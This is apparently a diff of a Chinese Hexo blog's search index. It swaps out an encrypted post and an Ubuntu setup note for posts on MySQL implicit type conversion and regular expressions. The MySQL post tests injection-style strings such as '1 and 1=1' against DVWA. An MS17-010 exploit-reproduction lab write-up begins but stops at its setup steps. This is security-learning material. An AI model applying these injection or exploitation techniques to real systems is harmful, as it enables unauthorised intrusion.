/+i7SOLIOt6LOSGLKdxLtsWoTWGA7C0/BveGY6TCAuGeBz+kqhDWkQnNBgsNoRe35Q04PA4aH9CvmYSgUQ7LznodNG/JmRJNatzvs9rrNDhQ7ueD8AlPXavEVWo4Zg2dSCygoJAcvF8YicsrjT/3wRdtv8Ai5gdoW5NwkzSj3a/Ophj07X+8JaxFXoCoZgmdq1LUct1hJczrjc4pcywDzlz2bDi+hQ/6zVnlKgHUHpOz5NX0NUWYvn/wU7VOiWThVF9zPLjkHbToGFbp+dG5dtSPEIxFfVeIgUgGKQjWgVWYIfSJcPWQ2LNKxGP1SRublaBULCotRwXfGZlyLP0rNLsS5tuusqvzwTLorSAgbP0b4NkGhuO0KtNOw0bLu4F9Z9s3vlQZIAcfUz/ShDT73Ubp5ODKDs4oVdTFUpWdOcnSBUyQ//9RbB9Ycr2v6J/1KG4zT/j1hak7YsaebZP5r0N+wkE4AsvECL9To+kcHWvsOkdzOFbGvskJ9RruEzvSklFnUOtKZlL/I4Yf+55b7cxUlQycdoWEefsgooAnnMU3W5RDghTZxeC/xCMN6Mi3u2NTnDdpzXOtQcAzj90VzpCyoUuNgzsioB1BZua63C0LxfuSXABPJeKm0RslLl7J4eIgP0wKfZR7n4Pm9+Z3EFCHrWr1gOHoe3v1ZOYm1BZ0CcTnZIZSFnKtgjBhxYaUUPEI60cBxGFs+HYraXc1TskdGfP8HGV0Ogz+ZPkGYeyyH9vnk6nTIVw3CLrrsmdhA78aVGaGTomXFxttFNsjo6oeGs40y3E0D1NU20VAdE8h8+5qerJldrMnLcA0plkmd4HvG9Kx69PYhYEVVlK9A8Pt6gB8Pzk7CwYmhQEAeoRII2SXNKt2UVAV3Ot1Z36MVmjhkemnwSwpHj60DqXhMi/xDVTynYruwVL0x7bmIlNFfSsF9DZ75IjR8gUxGiYY0tsw2CW1jX5piOCg4XW0tBCSbaABU159XVkDuc72ZIz2XD7rH2RaLAjqNn2MroGWOLNeSFAvFnugjvmsueEcsCP1ZVvLFMX88kyki03+I3DShWzP5pjxjGMiV4Um0Q2i3RScrQ/PmSb7MElWIJaHwVE7BxjxD0NPPAN7FwjiFyJlc3diHh/8AaHBg3T/SzFF58khT/olgbsCWalK2RKMJg9xfsYY86qHSBEyKUGwpSShZX4Pqat6qEqEPJZjHR/hVNc86zaQBKGJabp5T3RqKIe+69uPxV7our3oS/ceyqWEpw8JAa3XrLKGPi1xtANDbUwD08XB2ru+JNgN2imLyWtUxaPIiwX17krjtAHTaIRR8sexBKfF0lr0dFjtxZm3rCd4raNJlOoODV3maKzt5KLJ14JWeAl8AlvPmw5upwZ1p+LZg5/0or1hYZzMOhz8lRV1soSymXIzYfUwV+eQw2vURuc6STGZte1WOEG/OzQbiezsS79jTcku4nXzDhPnlWxrcKOdNXwvMZqzJz+DAKh1JRl446iLa2RIc+lgSEQCHgVEEBKCFFcTiRk1rhdtmA94ACNCxABA82mG477a7JkfbNJ6IVM0VQ2Uws+GA/PpxBae9yimaH6E32vQsCFTE+L2a6AGv6hSORafZ8X/0J7XOPpSMoyXDhWlKU6MrzpMNrljebQNXUvS5boBRcggpqnAhPlgK/MXQTmCvT3T8ITZLz5c/ek9Z34aQ/fZnMCbVPjLu/Vh3qyW2I9B6nG1zuwgiAsknurivk2s4PSskEBXzDkUWBq6bbBfU1fyN5q4CRitzXy/eLdLLblBwQPpQqMF6dv0d5cBrwYN73e4d8FqkfMCyjgqPuAm9FCuzM6Gh+1aq51UqsHQN/1AzkSspp4S3/J1DFjrWolSMBE9JBTB35dHyeZipHYgSJLgeEwpacX7hIs9Qbn7ZFhrVtcwcGJ34a+pftAm1FU5THg0KSlXFXpWUxbSobeRFLj/b80fimWMciRbFa/OI8N0jUHLhKjLL6f6rz0G9GspS6DwfxmA63U2xKACf7s6hFm8r4+5lRVvwyIzFirmU90DTYnQE23kIo1LRPm8wLI8j2vXn+4Azm+BCuGeqA7v0E3pNVd2X3u4e3RcYZU3eSQJ9f/wNw7rYVT72LPDhz6lNr5R/2YesM3V3ZzdBvDrXYM5HfP7JIJmmtNOLrcxz22U33iI4WWKc2X1RpOGwuTSlWCj6dATmIFwcE5ejrn3WTFDuFNd+QsBE0AZOF/mOYd7U9SnbYOKDzNa+5tQTf8CzENHnVOObg6/+7x6gZtHL8EyPrHVeNf3cZTt9g7zicUN/IjdiGfL+EkTo7gNaXcm8VgB9Qf1sJvf2f8IrCUjwAAkkbcYM7eweW8YBO4ifU+Mq53BV8iTpH2a0SFw/ur5sYjiDOfBLP2spd0kHfQwT/juYHpNowkLK4gMYJCzjtXRXzP9N7MIRO5HhhMPqUrqSqQVAcackfXBUHFiDWEG0+ZrDMc1BfbatTwRYD/epKtrpHjOl29Q+ZwZfUZUw1u33x2qKUYSeUwZQL4MWpQhRzazEcT2Wl1NAQcjHRzEEJ8JjKmNpyDfqYQDEU/j4mH4uCEyvqyFumFWwHrcX2z2/F/kWRDRdJ8xNmBQi1aSld2xLz2xGlSllumvI3Jy6zLfjjtggRgz2AhAcFIKJpBJoRqflt+zKsNzfdV3WQv+RwQ9S/8j6Nl3kPnTCHxLTqFVYMOrJaHeR7+6Y0GVZV+gwq4Zv0OUETA/zzJjYu7yf0Zacs/jbC4p3Bl5bhUtjtpmLN2S37MbavKlpkYnyXWVjflXVq0J9sg4CkgnkB8VbbTunsGM/mFst+6qMxyg5ziF7Svyq56LqvkAEha4SHEd3yvYyztsQGz9C/RsmzQ3PJX2uZBXSasS0TCE34P1t0EqzDeJ184DAe/lhMvsOQQUwE1vXR6PIpErDoOLrpY2zhQDFfiT7D/z0Nd0j0I6ikajQ0dI/QgZY3KvC7IfBGEAjorjpHn3IsLTT1WquLRJ2Hmc8Q6IWZAQZnFqa7QYgUAxZlIsUBodCFVdDJFRSXJ0s/a6J0KL2F62TSelHO8F3znPCzk39Llt+7MYvFLVrBB39um1PYqk1/zgNTqvCxmJHNGhjFdPg2jJJzryYWBemU4Axj1s+/T2hONSZTu8NGbQZbdhYmjYgL7pvDEWsJKfdhtyZs+C6mPrbszkJT9GAaCOm+rFCAofwyYJpvCBdu0YNzgOWXWdbHlG1Zg8Xn3sCmkRMQvqvRNavbIAmbExY7wRhUNaeRlH/TRrs/zEq+LijJhVzK8Rppagb9g80G5tY75y3L3544xHDP8DOjFztNhbIfj3dVqteaDOQhzrjw0kkk6erGcSz3kJMtUjBy8wNVC4huUq5gfAlOqZudVNJof22gze3939aYBInL0xPeD6uYddNP3BMkiYBm2MVOtj4Ggbz/nyWvTX1/MBhPry6el98rh+KdnUFIZB+CxEOKt8DeNko2h5POD/QZGqIw1GedW4/24fww9Jmfhj3tI00/k/yyyEhusa+HCmx3heuZuU41kYAqIYSjqXWYTQFjDORiWcHz83GQPeNEzb55xd6D8cgQE4udlRg+J2uM21Redl7UmpfGUYQAKCuIGfyyeLh0YMQt/SpE+KxwjiCjlQHlQDKmt4j30BILob+L5w8kXEKjbQCh6rcD2aMEFuZ1mp6a5CF9uRJiTWNDaT1NR4A+kGPLVki61ZQHXMZnOXL0+a0K2twEh57T0QZuHbnU68h/zYKH3Y428yG8J3ekIfOQRLI1DTwIwx4joB4MsSXk5NjuHJhS4SvQPmVgALAYrGF0Bc70fnCrbGuZrUanMYw2EUNlu9XUF2P0jVHd7+OZCyRy5ohct+jC2IA6Y2io/udnABFzcLAZf53gKlBHmkEMzkFJVNv+ZvWiEcdpuqUKHKWFAH66bZ8vVYPIhK8rTq2mkV8ryvvrJHbKc10mx4tolIbONnQrdKjo54kkN3A4RfXfKsG1Y7Tx+xOd/9ghly4Lc/uwuyH88RTkvwA2J8WlvAD3DlLrG7RzwHe9lZWJ1XXbjNKWxlGTOhN4Zwm+e5ZPR+fSHVD7hPXhMzftU2y2Wi9XX9KmhTW+8dWL2vH9KILJGztHGm/Sey3wvUldjd6cBJy1rmhRhCn2Q8C3gE1kYmMTBA76VuaRiG96cAHl0Yf/TM2plXnz34dWzIxfHZZwjZYXk9RxJ12zEgycrduLcZB81l7JB+k5o2p7yV76avcqA767lbDV6M7wKurVcmAczJX/vTUl863DowZBajkU2x2+XQZgBBrVvRONiKB+cVB8SNHiibhYHR4CXqm67yORHdKgufVpPqwrfQHIuJBeEnjOAUKEI0lA//KLtiuiWSiHLeas9ema5UeOXhWZg0WYAtfov50mnRS9ax8n0OX503qDTQq5kk3s4DG16CXmJLsKhnjwzQgCi2a1AXfHVaIeuR/q33JfbQr1iCdBDmJAVU84xps9IKjLu+xxb/Y0T8hSZsG4TPQVSokUW75nlDuuEtk7vLBIATEh86NGYcrzDx3WAI07pZXWdIzQRukcqqgNHIIhKqhXfQyU3jLprdS3grxnXOtYFzozk8Xe5DlTwMnhDXvWTocnj5M3FNit+fR3cCLxpGOQ/coTvKGGLqR1KfNH1Wp1308Ckg3bMLOeUqM9txve1hRzFoaKbmDvuk21MYz0j4ygS5Hz5wT9lvH3pOrMofFOoEdqT3qxz7vUxsn7hs6QRhYyw1FUs5nNlKqoY+9sf+TKSCG96yfwVenIFmfIQKVDQRRqY3Zf2Ke/x7Du8MfbkuNY/DpSsuoQfTYvhPp0aCLLKp4PrOlGHsGSMN1ddws/AA/iGXiFZcBg7CzeRMOgPC3FxNEfli/oKmATt4CyfFHRLXhp15iFMJOGQPRJIxiaim1iq64xIUeQwA/SuO0LVQ7L/Mcgfh/48DIn/WnK7zThOyMCc2ZynFhv74zKP6604xdqjkfDjfLC8fXa+vCs9yD5Y0A5CLGyJ6OS/4QozIoOCeWIIWThaX0B7Ko5ERCvBZ+ZA0tM57fxLd11deJayW3r0hFbKY2dB4W959RjfihVUWsXO5D2DCE7I+ENd0AdAmZsvoe8A/XMIwijIMqL2dOauwIbOslTXNQi+ORy3ziRt6jLMoJJvapGjTNA/tCzfpAc9NLuDip1d/9PNmJoX7n5HpcNTyEp1oBcT91LJEbnDtgtEyZi6JPRwEm/oUmjjm8oC6r2MD2f5V37+pzG+SVeR6TBz7D3YsbuR+qVYkS/YtAdIZYT6Pi8w67+erZYz4DEde6xyJXvbHwjnqY4yyFYnoiZ2OBksrDP5kARsjbd2xh72reMyYijBuleRXzg6hX9SACdcAHbLfoNKL7FwIerIL49IMU627jkJ1iYBhaiTVVTAEvxCB9qkH44rnCh7rAeFj856zxXA0wZi6uI98DCtUsZqji8BIlo1L8lFpz3b2vj3jSPabvo611L4tlAcECN/O/1pJCKYbvODiF1wS2BrSo2z0q96rYqUatuML6yV1Hkbk76XZAbB/8GSbjCnJBTonvN75XIQgUdpKS+mdKAhLHXYMnOsvBY08t5/lWxA3s4aeQNpBILj2GPj+DWfkioVyz+P5Ll66NeeJNHTx5W5YORZhNWShyQDQibQ45qtEDG7xNI5WCOT3P/zvPKFYIQ15iG71uWdrstFho0SGvELW0JD15CrmYxVmKx+jHDtSsBnD+erTgORm7q38x57YGkc+x9ONWn9TuLkksqQGlvq35oglA5tSd8px78Pxlsio93VNyfdAAbi5rmcY8KBlbYraT2/ZruqN7YBBLX4bOnPb4eY1xKv2ujfBoysS3ucAUuPDESam81QBCcsVTuP7vpd941NDTajfTaOl8WA7WMKA45S4lk8+1cXpZIdFQ8VTiQt6idDYLI6m1WnIU3cQzHdzn0Y77NqVcQc7iZ/kW7PvXVKY4u6RlDFTtVxCNZbneA3/mXG3buJH1BDZh8wisd8y49Lu+DnM9K4gJ3ddW60MDgW+B9zMPmiiA4EObAEy0HxIFr8tzeDkPJO9oOGNg0dzqhrpXorOsssSyKtagP6Cfd/fORC8mJ36qB381Ge+RcLPrL5AwoRd/P4SLOHBtPawEWf1tbUf+744EBwLg+qC8kjr3V+8IHe6jRqPPWNiuaH4RjplE+jz7epeEjKoj23b7GNNkB9ez/a1HnQC4/XPk/VsdwJqUrEzfjL4P/Jg3Bo0kFxFeCyMXGONhX7QGs2iaPx3uc0UXj3pJbo8JZMBc/DlhA2nVA6zcLfGHP1CHB5fQ5//GcL72qRLL/6ZuU0T8dlneWZbrV/ICe9OMmHOaIEebiyHeccwEMUQeDilvX9Z6DYEUH8N0Ry4sLR9nzeMXA3gYlV/NP7Jp7ihBTjekTHi5rGv+OVVr1Tfd/2qzkLpkrtIUeZXsPOt5PhgkMLQ0F/r7kfW9c6N3oLFwTEsH/H2bPmpetlMxvSFuRC7HLrTuu/tyYobxvuCuxk8N4dSOvpVuw6ZKqNuZXB5lZnf8HyARTwRa98xH/lJ1qqEo0aCFVnRNcizGpFqzRIkUpkrlQXFJbocuC2FlHY7SeRNgSPXGHdfrEHBqr3GFnYT/WL3kLd7fBrir4Fl/4C6wM4aIjeSl+kYSXJZ8KF0Q1KRD7nHOPmNIP8fYCWNJ+FEMftUdWym6Egqp8WAnYCpMsznr1il63Y/JjZ2O3pvMSklCwxVcUupc8zmvdpMVXjstrePJAy4WUahJ0/8xvoNk1CGbyPa91Wfv1BXTlc1caqSI69Rebp4mrhlD9gNrQcSI/1gZXk+kAlhfar/Wjsb3H4kJHKFSF5n0VdXjg6y+mxt3nWkJd9Vkgrhxy4s7annfw8dBjvPPg+0xj+OLPLpiLQRrDHO6C917aFEsmRYHfrWGTosyXOMCwHqe03eR3KYhd0cXEV49zZ6yqS3euPiy8xBsGOPM5C7TPj/ELq7IfRorStaI3KDE1eksjJQnsdwOCmxaNgb4aU1yVQafU4hwrYaq0Xa7vkAfEyUyHMBRZQQOX6T+uWG16eNlue7NUi2vWV3vr3k4EOBuZMkmCyG6vp4Q9t4ydFcEReKHNVqSpI8Z+lfaslpnD53fDEt9N2CuSAJ5U8StYmQgA/UARXck5lnJ5F2k05jpHrQ8a9BXx/Vlfud2usn4RIY0rn09lroJQGmyldNUS9jh6jAxBCEAqLmpQqAfJFiwMdwgXBGXr3FIvuAgYpHlmeYusV0vwzFC02F1P8BEg0Ussr7RtsHbbaE6qoY9q3LE9WJcJBM4YCme8Q9Jksr+JHhn/15Hj/c/Q9Dbfg7PvBjYYsPUFvuc1lBEnx51dVdbdiZNUhrso2T0ocIC6wwNlaicyrOOALtpgfCyWrusFj8n5EbiHYZT69wR+y1XTvm56uPxy8/Q+gEJfW94rW8Jlw9YA81JIufscVSeJNMnCGDVBbJjNlAPbs0nKfEwgSQUhortEPuZDFEyeEX9zZn7v9h0GeFVSPTBzNE15jeebaOPaPy0P4brkrc7/TjAdRAsQ/JbY6AX/vwTLges1jmbXAh7zY6MScTcQNpObdF8KPin3nhiAwCiJ2h88nxIU9UqxpKR0UPp58zi2AUnaTCuLDv6x6ev+8dgZjLjXbiuo7Obd6H3YI2IN5qqj4LbyAnaPQsjH7za6vHYYZdPI1LKjsLBrCvBtXl1bMcc1uf7HHpPYhCCD0RxcKMHqtmYvYQEwVvjur7bgugdIOVLjMicteNVTHk3cFSnxWiZcl44J8o9FNF9QrIu7tSWGWk4wkPYJ7c/FKfyNbWIeDF2DDvyg4S+9Xi/LMZWr7+W1g/KldrwXBRvNfwUsQ/6/hkN+vDXnUSHjNrJwNylXaKVLVwQp7B28arzmOMgmv//HYe8WoHkzuPVXppFMRuKTH4yE78fC8qKJE9Jw8+7Lrvx908TmGFsWPaUxe48C3uhvgUEcBPKQ5GEJc8E0Lxx+jtT9ZvlKUB2NUAEZkMjKBwlA1d7o8mRuXjBuQokWUSge+uswiGDOd1BINZbGzp3RZtw6bBLFaU7mVc6rBVJ4BuNFEPmnwIZ3HkRsuye7T8dk7G2+YzdVQbdSHU12+8giyI/5E4KSyyx5VJAuWuQW2dlX6m7cisZdA31tHAthqGL94M5fDEAdzWdOh8kqz/m87Bvi4dDqKMzJxKhgWs6/8UQSOka1UCH6mWeTwgNYKg/dUJG/jHJ0DOIuorHuOyK8A2nrIL/tnyeXoH0c8ju9uZAQBtbvSi+A1u6O2nxxDjZCXJulelgwgaHKZLkG7n2urwVY4bBAVRPVYdVCTHP0mFPaaE7Rd3DEKGulqNF5cijOcvoAwzaYApDdk5DMaQJ8kVa7O3Tdqq8VR75pq5At6xH5F3NjLVtm70sLmgtMnmuke5tcjGpE1QlNB6pq43I00DsFoYWjwwcvKv4wBGSYi5SNGebGTC6mgNQHSuCXrCTps954401p9OefHKkhn0fMGSHJo//5Yz4abOvWzrQQ0YMKicl+lc+JuGAG5HhnE9Sm+NQ4TJvD92ycW+9OyWRSo8xSqnubTj2Z9e1x/qHhgmLx87kN/8mE29+z2NrCNAsEyknZkGYOgxBSYqfxNoKadgOKnBmoWfaVuQf5Z4O7oeCe1LwkmJIzoZv3qz8Qw6AjjEkNr0+QJAChfVXz0nEMppI+bNZ73w2BhYupd8YPjuUwJRazokOhrnALXcCGVkPcEzP1K2z6JGEivX1HbDGVDtl6n6wuKgpfnTLzRVeKFl8UeQx8wuQENIz36WO49fIQVDiieQkawm9vAXK8/te+aopBcnVOvxABqt6115UvNhtdAisq+O6dE13/iHx4DwTUQSG610MBEktGWNIhlq+ccebiOOjv2gT+P6p9M68tbDRSXCLcIJIkVwdNIPPMt0MSt/TYeYaBQ/hEpiYui9LpLOOl6zxYLIqZACa8oMc8hdRhOFNDfVHTGzJ7TeIjs2fVApako6lEn5jhDx39wWiYQA0ISs2pswWN9 </div>]]></content>
-      <categories>
-        <category>杂记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>在Markdown中使用emoji表情</title>
     <url>/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/</url>
-    <content><![CDATA[<h2 id="emoji表情大全"><a class="header-anchor" href="#emoji表情大全"></a>emoji表情大全</h2>
+    <content><![CDATA[<h1>emoji表情大全</h1>
 <p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/u8SbATtdLwU5VjB.png" alt></p>
 <p>理想情况下，在Markdown编辑器中输入如上图所示的语句后将显示对应的emoji表情。但是否显示则取决于你的markdown解析器。</p>
-<h2 id="hexo博客使用emoji"><a class="header-anchor" href="#hexo博客使用emoji"></a>hexo博客使用emoji</h2>
+<h1>hexo博客使用emoji</h1>
 <p><strong>hexo</strong> 框架默认的markdown解析器是<code>hexo-renderer-marked</code>，并不支持emoji表情的解析。所以如果想要在博客文章里添加emoji表情😮，可以考虑使用<code>hexo-renderer-markdown-it</code> 解析器。</p>
 <p>首先打开Node.js的命令行并移动到你的博客根目录下</p>
 <p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/jQKAbRWvhGMDFgx.png" alt></p>
@@ -189,38 +83,125 @@
       </tags>
   </entry>
   <entry>
-    <title>Ubuntu (20.04)虚拟机安装配置</title>
-    <url>/2020/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>VMWare 安装Ubuntu系统时一般会默认使用简易安装，会有一个安装<code>open-vm-tools</code>的过程，如果在这里卡了很长时间，可以尝试关闭虚拟机再重新启动，完成安装过程</p>
-<h2 id="换源"><a class="header-anchor" href="#换源"></a>换源</h2>
-<p>Ubuntu安装好之后首先要做的就是换源，需要<strong>特别注意的一点</strong>是不要随便从一篇博客里复制粘贴源的地址到<code>sources.list</code>，因为每个不同版本的Ubuntu分别有自己的代号，源的链接是不同的，需要自己去官网找。</p>
-<h2 id="安装中文输入法"><a class="header-anchor" href="#安装中文输入法"></a>安装中文输入法</h2>
-<p>设置-&gt;区域和语言-&gt;管理已安装的语言</p>
-<p>弹出<code>语言支持</code>的窗口，选择<code>添加或删除语言</code>，找到中文简体，应用，然后设置<code>地区格式</code>，应用后关闭该窗口。</p>
-<p>回到<code>区域和语言</code>，设置<code>格式</code>为中国，然后注销，重新登陆，再次打开这个界面就可以添加中文输入法了。</p>
+    <title>mysql的自动类型转换</title>
+    <url>/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/</url>
+    <content><![CDATA[<p>在查询语句的条件判断子句中，如果等号左右两边的类型不同，则会自动进行类型转换。以如下数据表为例</p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084058433.png" alt="image-20200722084058433"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082629984.png" alt="image-20200722082629984"></p>
+<p><code>DVWA</code>的<code>user</code>表👆</p>
+<p>在进行以下查询时结果如图：</p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082807883.png" alt="image-20200722082807883"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082829117.png" alt="image-20200722082829117"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084904218.png" alt="image-20200722084904218"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084727031.png" alt="image-20200722084727031"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722083932481.png" alt="image-20200722083932481"></p>
+<p>通过上面几个查询的例子可以看到，mysql查询语句的条件判断中，像user_id = ‘xxx’ 这种条件，user_id 是整型，而 ‘xxx’ 是字符串型，在判断时，'xxx’会被当作一个整型与 user_id进行比较。</p>
+<p>而转换的规则也很有意思。</p>
+<p>‘1 and 1=1’ 被当作 1</p>
+<p>‘1 and 1=2’ 也被当作1</p>
+<p>‘2 and 1=1’ 被当作2</p>
+<p>经过更多的测试可以发现</p>
+<p>这个字符串（不论是单引号或者是双引号）在被当作整型数进行处理的时候</p>
+<p>如果第一个字符不是数字，那么该字符串被当成<code>0</code>来处理；</p>
+<p>如果第一个字符是数字，那么这个字符串就等于从第一个字符开始的数字串</p>
+<p>比如：‘4gsb’ = 4；‘108hh’ = 108</p>
 ]]></content>
       <categories>
-        <category>环境配置</category>
+        <category>工具</category>
+        <category>mysql</category>
       </categories>
       <tags>
-        <tag>linux</tag>
-        <tag>环境配置</tag>
+        <tag>mysql</tag>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正则表达式学习笔记（不定期更新）</title>
+    <url>/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
+    <content><![CDATA[<h1>一、简介</h1>
+<blockquote>
+<p>正则表达式是描述一组字符串特征的模式，用来匹配特定的字符串。 ——Ken Thompson</p>
+</blockquote>
+<p>一个正则表达式是一串特殊的字符串，它可以用于匹配一组字符串。比如</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\d</span><br></pre></td></tr></table></figure>
+<p>就是一个简单的正则表达式，它可以用来匹配0~9范围内的任意<strong>一个数字</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^(\(\d&#123;3&#125;\)|^\d&#123;3&#125;[.-]?)?\d&#123;3&#125;[.-]?\d&#123;4&#125;$</span><br></pre></td></tr></table></figure>
+<p>而上面这个式子也是一个正则表达式，只不过复杂了一些，它可以匹配10位的北美电话号码。无论区号是否加括号，数字间是否有句点或连字符，它都可以匹配。</p>
+<p><strong>学习时用到的工具</strong>：</p>
+<p><a href="http://www.regexpal.com">Regexpal网站</a>：可以在线测试正则表达式</p>
+<p>…</p>
+<h1>二、基础</h1>
+<h2 id="1、字符的匹配"><a class="header-anchor" href="#1、字符的匹配"></a>1、字符的匹配</h2>
+<h3 id="a-字面值匹配"><a class="header-anchor" href="#a-字面值匹配"></a>a.字面值匹配</h3>
+<p>最简单的一种，比如一个数字字符串<code>666</code>，可以在目标文本中匹配所有的<code>666</code></p>
+<p><img src="/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/fN1TQqSlujEPBCy.png" alt></p>
+<h3 id="b-字符组匹配"><a class="header-anchor" href="#b-字符组匹配"></a>b.字符组匹配</h3>
+<p>正则表达式将方括号<code>[]</code>视为特殊的元字符，因此方括号本身不参与匹配，而对括号内容进行匹配。</p>
+<p><code>[0-9]</code>这个正则表达式将会匹配0到9范围内的任意数字。要匹配任意3位数字可以用如下正则表达式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[0-9][0-9][0-9]</span><br></pre></td></tr></table></figure>
+<h3 id="c-字符组简写式（元字符）"><a class="header-anchor" href="#c-字符组简写式（元字符）"></a>c.字符组简写式（元字符）</h3>
+<p>例如：<code>[0-9]</code>可以简写为<code>\d</code>，它们都能匹配0到9之间的任意一个数字。</p>
+<p>空白字符：</p>
+<p><code>\f</code>：换页符</p>
+<p><code>\n</code>：换行符</p>
+<p><code>\r</code>：回车符</p>
+<p><code>\t</code>：制表符（Tab的缩进）</p>
+<p><code>\v</code>：垂直制表符</p>
+<p><code>\s</code>：任意一个空白字符，等价于 [\f\n\r\t\v]</p>
+<p><code>\S</code>：对<code>\s</code>取非，即任意非空字符</p>
+<p>数字元字符：</p>
+<p><code>\d</code>：匹配任意阿拉伯数字</p>
+<p><code>\D</code>：匹配任意非数字字符（如连字符<code>-</code>)</p>
+<p>字母数字元字符：</p>
+<p><code>\w</code>：大小写字母，下划线和数字，等价于[a-zA-Z0-9]</p>
+<p><code>\W</code>：对<code>\w</code>取非</p>
+<h3 id="d-任意字符的匹配"><a class="header-anchor" href="#d-任意字符的匹配"></a>d.任意字符的匹配</h3>
+<p><code>.</code>：点号（英文句号）可以匹配任意字符（但一般不匹配换行符）。</p>
+<p><code>.</code>是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上<code> \</code> 。</p>
+<h2 id="2-捕获分组和后向引用"><a class="header-anchor" href="#2-捕获分组和后向引用"></a>2.捕获分组和后向引用</h2>
+<p>将<code>\d</code>放到<code>()</code>中，则<code>\d</code>匹配到一个数字的同时该数字被捕获。捕获之后则可以被后向引用。</p>
+<p><code>\1</code>后向引用被捕获的字符。</p>
+<p>例如：正则表达式 <code>(\d)\d\1</code>  可以匹配 <code>101</code> 或者 <code>212</code> , <code>383</code> 等等,但无法匹配 <code>102</code> 。因为<code>\1</code>引用的是那个被捕获的字符，所以这个正则表达式匹配到的一定是某三个相连数字，其中第一个数字和第三个数字一定是相同的。</p>
+<h2 id="3-量词"><a class="header-anchor" href="#3-量词"></a>3.量词</h2>
+<p><code>\d{3}</code>匹配三个相连数字，这里<code>{3}</code>就是一个量词，花括号中可以有多个数字（用逗号<code>,</code>隔开）比如<code>{3,4}</code>表示3个或者4个；</p>
+<p><code>\d-?</code>匹配一个数字，如果该数字之后跟着一个连字符那么连字符也会被匹配到。这里的<code>?</code>也是一个量词，表示0个或1个；</p>
+<p>同理，其他常用的量词还有</p>
+<p><code>+</code>：表示1个或者多个</p>
+<p><code>*</code>：表示0个或者多个</p>
+<h2 id="4-括选文字符"><a class="header-anchor" href="#4-括选文字符"></a>4.括选文字符</h2>
+<p>现在可以看看下面这个比较健壮的表达式了，就是简介中的那个，它匹配10位的北美电话号码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^(\(\d&#123;3&#125;\)|^\d&#123;3&#125;[.-]?)?\d&#123;3&#125;[.-]?\d&#123;4&#125;$</span><br></pre></td></tr></table></figure>
+<p><code>^</code>匹配行起始位置，即<code>^</code>后面跟着的内容<code>(\(\d{3}\)|^\d{3}[.-]?)</code>必须出现在行首；</p>
+<p><code>\(</code>和<code>\)</code>就是将左右括号转义，让它表示其字面意思，而不是捕获分组的开始结束标志；</p>
+<p><code>|</code>表示或运算，即匹配<code>|</code>两边的内容之一；</p>
+<p><code>[.-]</code>匹配一个可选的点号（这里点号不再匹配任意字符）或连字符；</p>
+<p><code>$</code>匹配行的结束标志</p>
+<p>这个表达式最终匹配十位的北美电话号码，而且括号、连字符或者点号都是可选的。你可以试试不同格式的电话号码，看看它能否匹配。以上正则表达式中的捕获分组并不是必需的。分组是必要的，但是捕获不需要。更好的方法是使用非捕获分组。</p>
+<h1>三、模式匹配</h1>
+<p>留坑待填</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>正则表达式</category>
+      </categories>
+      <tags>
+        <tag>正则表达式</tag>
       </tags>
   </entry>
   <entry>
     <title>MS17-010漏洞复现</title>
     <url>/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id="复现环境"><a class="header-anchor" href="#复现环境"></a>复现环境</h2>
+    <content><![CDATA[<h1>复现环境</h1>
 <p>靶机：Windows server 2012 R2 standard	(192.168.233.129)</p>
 <p>攻击机：Kali Linux	(192.168.233.128)</p>
-<h2 id="步骤"><a class="header-anchor" href="#步骤"></a>步骤</h2>
-<h3 id="1-环境配置"><a class="header-anchor" href="#1-环境配置"></a>1. 环境配置</h3>
+<h1>步骤</h1>
+<h2 id="1-环境配置"><a class="header-anchor" href="#1-环境配置"></a>1. 环境配置</h2>
 <p>关闭靶机防火墙</p>
 <p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201425575.png" alt="image-20200718201425575"></p>
